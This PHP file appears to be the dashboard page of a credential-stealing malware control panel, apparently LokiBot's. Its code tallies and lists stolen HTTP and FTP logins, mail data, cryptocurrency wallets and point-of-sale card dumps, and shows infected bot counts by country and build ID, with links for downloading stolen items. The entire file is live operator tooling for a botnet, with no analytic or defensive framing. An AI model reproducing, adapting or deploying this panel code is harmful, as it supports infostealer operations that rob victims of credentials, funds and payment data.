<?php if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) die(); ?>
			<div class="row">
				<div class='col-md-1 sidebar'></div>
				<div class='col-md-10 main' align="center">
		<div class="col-sm-12 col-md-10 col-md-offset-1">
	<?php
		$TotalReports = $LokiDBCon->CountReportsByTime(NULL);
		if($TotalReports > 0)
		{
			echo '
			<div style="padding-bottom: 30px;"><img width="680" height="230" src="?' . ACTVALUE_ . "=chart&" . OPTVALUE_ . '=24h" /></div>
			<div style="padding-bottom: 30px;"><img width="680" height="230" src="?' . ACTVALUE_ . "=chart&" . OPTVALUE_ . '=os"  /></div>';
		}

		$TotalData = $HTTPCnt = $FTPCnt = $OtherCnt = $WalletCnt = $TotalDataW = $TotalDump = $ErrorCnt = 0;
		
		$ErrorCnt	= $LokiDBCon->CountData("error");
		
		if(MODULE_STEALER)
		{
			$TotalData	= $LokiDBCon->CountData();
			$HTTPCnt	= $LokiDBCon->CountData("http");
			$FTPCnt		= $LokiDBCon->CountData("ftp");
			$OtherCnt	= $LokiDBCon->CountData("data");
			$TotalData = $TotalData - $ErrorCnt;
		}
		if(MODULE_WALLET)
		{
			$WalletCnt	= $LokiDBCon->CountWallet();
			$TotalDataW = $TotalData + $WalletCnt;
		}
		
		if(MODULE_POS_GRABBER)
		{
			$TotalDump	= $LokiDBCon->CountData("dump");
		}
		
		if(MODULE_STEALER)
		{
			$Table[] = array( GetText_('main_total_data', FALSE),  	$TotalDataW);
			$Table[] = array( GetText_('main_total_http', FALSE),  	$HTTPCnt . " (" .Percentage($HTTPCnt, $TotalDataW, 1). "%)");
			$Table[] = array( GetText_('main_total_ftp', FALSE),  	$FTPCnt . " (" .Percentage($FTPCnt, $TotalDataW, 1). "%)");
			$Table[] = array( GetText_('main_total_other', FALSE), 	$OtherCnt . " (" .Percentage($OtherCnt, $TotalDataW, 1). "%)");
		}
		
		if(MODULE_WALLET)
			$Table[] = array( GetText_('main_total_wallet', FALSE),	$WalletCnt . " (" .Percentage($WalletCnt, $TotalDataW, 1). "%)");
		
		if(MODULE_POS_GRABBER)
		{
			$Table[] = array( GetText_('maint_total_dumps', FALSE),	$TotalDump . " (" .Percentage($TotalDump, $TotalDataW, 1). "%)");
		}
		
		if(MODULE_STEALER)
		{
			$Last1Hour	= $LokiDBCon->CountReportsByTime(LastHour(1));
			$LastDay	= $LokiDBCon->CountReportsByTime(LastHour(24));
		
			$Table[] = array( GetText_('main_total_report', FALSE),	$TotalReports);
			$Table[] = array( GetText_('main_new_report_1', FALSE), $Last1Hour);
			$Table[] = array( GetText_('main_new_report_24', FALSE),$LastDay);
		}
		
		$TotalBots_ = NULL;
		if(MODULE_LOADER)
		{
			$TotalBots_ = $LokiDBCon->CountBotsByTime(NULL);
			$Table[] = array( GetText_('main_total_bots', FALSE), $TotalBots_);
			//$Table[] = array( GetText_('main_new_botsnew_1', FALSE), $LokiDBCon->CountBotsByTime(LastHour(1), TRUE));
			$Table[] = array( GetText_('main_new_botsnew_24', FALSE),$LokiDBCon->CountBotsByTime(LastHour(24), TRUE));
			//$Table[] = array( GetText_('main_new_botsnew_7', FALSE),$LokiDBCon->CountBotsByTime(LastHour(24*7), TRUE));
			
			$Table[] = array( GetText_('main_new_bots_1', FALSE), $LokiDBCon->CountBotsByTime(LastHour(1)));
			$Table[] = array( GetText_('main_new_bots_24', FALSE),$LokiDBCon->CountBotsByTime(LastHour(24)));		
			$Table[] = array( GetText_('main_new_bots_7', FALSE), $LokiDBCon->CountBotsByTime(LastHour(24*7)));
			
			if($TotalBots_ > 0)
			{
				echo '
				<div style="padding-bottom: 30px;"><img width="680" height="230" src="?' . ACTVALUE_ . "=chart&" . OPTVALUE_ . '=os_bots" /></div>';
			}
		}
		
		/*$Table[] = array( GetText_('main_server_time', FALSE), NowDate(NULL, time()));
		$Table[] = array( GetText_('main_php_version', FALSE), PHP_VERSION);*/
		if($ErrorCnt > 0)
			$ErrorCnt = '<a href="?' .ACTVALUE_. '=error">' .$ErrorCnt. '</a>';
		
		$Table[] = array( GetText_('main_total_errors', FALSE), $ErrorCnt);
		PrintTable(GetText_('main_statistics', FALSE), $Table, $SizeA = "70%", $SizeB = "30%");
		unset($Table);
		
		if(MODULE_STEALER)
		{
			$Lasts_ = $LokiDBCon->GetData(NULL, 0, 10);
			if($Lasts_ != NULL && isset($Lasts_["NumOfData"]) && $Lasts_["NumOfData"] > 0)
			{
				$Table = array();
				
				for($i = 0; $i < $Lasts_["NumOfData"]; $i++)
				{
					if(isset($Lasts_[$i]["data_client"]))
					{
								$DataRead = '';
								if($Lasts_[$i]["data_client"] == 202)
								{
									$Dr_Title = '<img style="margin-top:-2px; margin-left:5px; vertical-align:middle;" src="'.INCLUDE_.'/style/icon/read.png" alt="" height="16" width="16">';
									$DataRead = '<a target="blank" href="'. "?" . ACTVALUE_ . "=download&opti=datar&id=" . $Lasts_[$i]["data_id"] . '">' . $Dr_Title . '</a>';
								}
						
						$Text = '';
						if($Lasts_[$i]["data_type"] == "datadl")
						{
							$Name = explode("|", $Lasts_[$i]["data_text"]);
							$Text = FormatDatadl(FormatShort($Name[0]), $Lasts_[$i]["data_type"], $Lasts_[$i]["data_id"]) . $DataRead;
						}
						else if($Lasts_[$i]["data_type"] == "mail")
						{
							$Text = FormatShort(FormatMail($Lasts_[$i]["data_text"]));
						}
						else
						{
							$Text = FormatShort($Lasts_[$i]["data_text"]);
						}
							
						
						$Table[] = array( $Text, FormatIcon($Lasts_[$i]["data_client"]) );
					}
				}
				
				PrintTable(GetText_('main_last_data', FALSE), $Table, "70%", "30%");
				$Table  = NULL;
				$Lasts_ = NULL;
			}

			$Clients_ = $LokiDBCon->GetClientData();
			if($Clients_ != NULL && sizeof($Clients_) > 0)
			{
				$Table = array();
				
				for($i = 0; $i < sizeof($Clients_); $i++)
				{
					if(isset($Clients_[$i]["data_client"]))
					{
						$Table[] = array
								   ( FormatIcon($Clients_[$i]["data_client"]), $Clients_[$i]['Count_']. " (" .Percentage($Clients_[$i]['Count_'], $TotalData, 1). "%)" );
					}
				}
				
				PrintTable(GetText_('main_top_client', FALSE), $Table, "70%", "30%");
				$Table = NULL;
				$Clients_ = NULL;
			}
		}
		if(MODULE_WALLET)
		{
			$Wallets_ = $LokiDBCon->GetWallet(0, 10);
			if($Wallets_ != NULL && sizeof($Wallets_) > 0 && isset($Wallets_["NumOfData"]) && $Wallets_["NumOfData"] > 0)
			{
				$Table = array();
				
				for($i = 0; $i < $Wallets_["NumOfData"]; $i++)
				{
					if(isset($Wallets_[$i]["wallet_name"]))
					{
						$Table[] = array
								   ( FormatDatadl(FormatShort($Wallets_[$i]["wallet_name"]), 'wallet', $Wallets_[$i]["wallet_name"]), FormatIcon($Wallets_[$i]["wallet_client"], TRUE) );
					}
				}
				
				PrintTable(GetText_('main_last_wallet', FALSE), $Table, "70%", "30%");
				$Table 	  = NULL;
				$Wallets_ = NULL;
			}

			$ClientsW_ = $LokiDBCon->GetClientWallet();
			if($ClientsW_ != NULL && sizeof($ClientsW_) > 0)
			{
				$Table = array();
				for($i = 0; $i < sizeof($ClientsW_); $i++)
				{
					if(isset($ClientsW_[$i]["wallet_client"]))
					{
						$Table[] = array
								   ( FormatIcon($ClientsW_[$i]["wallet_client"], TRUE), $ClientsW_[$i]['Count_']. " (" .Percentage($ClientsW_[$i]['Count_'], $WalletCnt, 1). "%)" );
					}
				}
				
				PrintTable(GetText_('main_top_wallet', FALSE), $Table, "70%", "30%");
				$Table = NULL;
				$ClientsW_ = NULL;
			}
		}

		
		$Countrys_ = $LokiDBCon->GetCountryData();
		if($Countrys_ != NULL && sizeof($Countrys_) > 0)
		{
			$Table = array();
			for($i = 0; $i < sizeof($Countrys_); $i++)
			{
				if(isset($Countrys_[$i]["report_country"]))
				{
					$Table[] = array
				( GetCountryName($Countrys_[$i]['report_country']) . ' (' . $Countrys_[$i]['report_country'] . ')', $Countrys_[$i]['Count_']. " (" .Percentage($Countrys_[$i]['Count_'], $TotalReports, 1). "%)" );
				}
			}
			PrintTable(GetText_('main_top_country', FALSE), $Table, "70%", "30%");
			$Countrys_ = NULL;
			$Table = NULL;
		}
		
			$Countrys_ = $LokiDBCon->GetCountryData(10, "report_id", "report_bin_id", 0);
			if($Countrys_ != NULL && sizeof($Countrys_) > 0)
			{
				$Table = array();
				for($i = 0; $i < sizeof($Countrys_); $i++)
				{
					if(isset($Countrys_[$i]["report_bin_id"]))
					{
						$Table[] = array
						( $Countrys_[$i]['report_bin_id'], $Countrys_[$i]['Count_']. " (" .Percentage($Countrys_[$i]['Count_'], $TotalReports, 1). "%)" );
					}
				}
				PrintTable(GetText_('main_top_bin_id_report', FALSE), $Table, "70%", "30%");
				$Countrys_ = NULL;
				$Table = NULL;
			}
		
		if(MODULE_LOADER)
		{
			$Countrys_ = $LokiDBCon->GetCountryData(10, "bot_id", "bot_country",1);
			if($Countrys_ != NULL && sizeof($Countrys_) > 0)
			{
				$Table = array();
				for($i = 0; $i < sizeof($Countrys_); $i++)
				{
					if(isset($Countrys_[$i]["bot_country"]))
					{
						$Table[] = array
								   ( GetCountryName($Countrys_[$i]['bot_country']) . ' (' . $Countrys_[$i]['bot_country'] . ')', $Countrys_[$i]['Count_']. " (" .Percentage($Countrys_[$i]['Count_'], $TotalBots_, 1). "%)" );
					}
				}
				PrintTable(GetText_('main_top_country_bot', FALSE), $Table, "70%", "30%");
				$Countrys_ = NULL;
				$Table = NULL;
			}
			
			$Countrys_ = $LokiDBCon->GetCountryData(10, "bot_id", "bot_bin_id",1);
			if($Countrys_ != NULL && sizeof($Countrys_) > 0)
			{
				$Table = array();
				for($i = 0; $i < sizeof($Countrys_); $i++)
				{
					if(isset($Countrys_[$i]["bot_bin_id"]))
					{
						$Table[] = array
								   ( $Countrys_[$i]['bot_bin_id'], $Countrys_[$i]['Count_']. " (" .Percentage($Countrys_[$i]['Count_'], $TotalBots_, 1). "%)" );
					}
				}
				PrintTable(GetText_('main_top_bin_id_bots', FALSE), $Table, "70%", "30%");
				$Countrys_ = NULL;
				$Table = NULL;
			}
		}

		$Table[] = array( GetText_('main_server_time', FALSE), NowDate(NULL, time()));
		$Table[] = array( GetText_('main_php_version', FALSE), PHP_VERSION);
		PrintTable(GetText_('main_server_information', FALSE), $Table, $SizeA = "70%", $SizeB = "30%");
		unset($Table);

		?>
					</div>
				</div>
			</div>
		</div>
	</div>
</body>
</html>
